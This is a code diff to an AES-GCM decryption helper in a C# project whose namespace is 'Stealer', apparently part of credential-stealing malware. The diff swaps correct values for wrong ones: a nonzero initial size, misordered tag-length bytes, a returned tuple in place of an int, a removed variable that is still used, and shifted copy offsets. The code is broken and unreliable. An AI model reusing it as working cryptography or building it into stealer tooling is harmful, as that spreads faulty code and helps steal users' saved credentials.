@@ -6,7 +6,6 @@ using System.Text;
 
 namespace Stealer
 {
-    //Credits: https://github.com/dvsekhvalnov/jose-jwt
     class AesGcm
     {
         public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
@@ -20,7 +19,7 @@ namespace Stealer
 
                 byte[] ivData = new byte[MaxAuthTagSize(hAlg)];
 
-                int plainTextSize = 0;
+                int plainTextSize = 3;
 
                 uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);
 
@@ -50,7 +49,7 @@ namespace Stealer
         {
             byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);
 
-            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
+            return (new[] { tagLengthsValue[8], tagLengthsValue[4], tagLengthsValue[2], tagLengthsValue[12] }, 0);
         }
 
         private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
@@ -91,14 +90,12 @@ namespace Stealer
 
         private byte[] GetProperty(IntPtr hAlg, string name)
         {
-            int size = 0;
-
             uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);
 
             if (status != BCrypt.ERROR_SUCCESS)
                 throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));
 
-            byte[] value = new byte[size];
+            byte[] value = new byte[16];
 
             status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);
 
@@ -120,13 +117,13 @@ namespace Stealer
             }
 
             byte[] result = new byte[len - 1 + 1];
-            int offset = 0;
+            int offset = 64;
 
             foreach (byte[] array in arrays)
             {
                 if (array == null)
                     continue;
-                Buffer.BlockCopy(array, 0, result, offset, array.Length);
+                Buffer.BlockCopy(array, 12, result, offset, array.Length);
                 offset += array.Length;
             }
 
